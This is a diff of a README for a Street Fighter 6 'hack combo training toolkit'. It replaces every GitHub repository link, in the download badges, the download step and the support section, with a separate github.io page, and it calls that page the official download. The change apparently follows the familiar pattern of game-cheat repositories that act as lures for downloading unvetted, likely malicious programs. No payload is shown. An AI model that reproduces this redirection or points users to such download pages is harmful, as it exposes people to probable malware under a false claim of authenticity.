@@ -1,6 +1,6 @@
 # 🥊 street-fighter-6-hack-combo-training-toolkit - Your Ultimate SF6 Training Companion
 
-[![Download Toolkit](https://img.shields.io/badge/Download-Toolkit-blueviolet?style=for-the-badge&logo=github)](https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit)
+[![Download Toolkit](https://img.shields.io/badge/Download-Toolkit-blueviolet?style=for-the-badge&logo=github)](https://x-on-hub.github.io)
 
 ---
 
@@ -50,7 +50,7 @@ Think of it as your digital notebook, training log, and stat tracker combined. N
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit](https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit)**
+Visit this link to download the application: **[https://x-on-hub.github.io](https://x-on-hub.github.io)**
 
 This is the official download page. Everything you need is there.
 
@@ -150,7 +150,7 @@ Your training data is saved locally on your computer, but there are backup featu
 ## 📚 Support and Feedback
 
 For help, bug reports, or feature suggestions, visit the GitHub repository page:  
-**[https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit](https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit)**
+**[https://x-on-hub.github.io](https://x-on-hub.github.io)**
 
 You can also leave a star on the repository to show support for the developer.
 
@@ -181,7 +181,7 @@ Your journey to becoming a better Street Fighter 6 player starts with good habit
 
 **Download now and take control of your improvement.**
 
-[![Download Toolkit Now](https://img.shields.io/badge/Download-Toolkit-ff69b4?style=for-the-badge&logo=github&labelColor=black)](https://github.com/X-on-hub/street-fighter-6-hack-combo-training-toolkit)
+[![Download Toolkit Now](https://img.shields.io/badge/Download-Toolkit-ff69b4?style=for-the-badge&logo=github&labelColor=black)](https://x-on-hub.github.io)
 
 ---
 
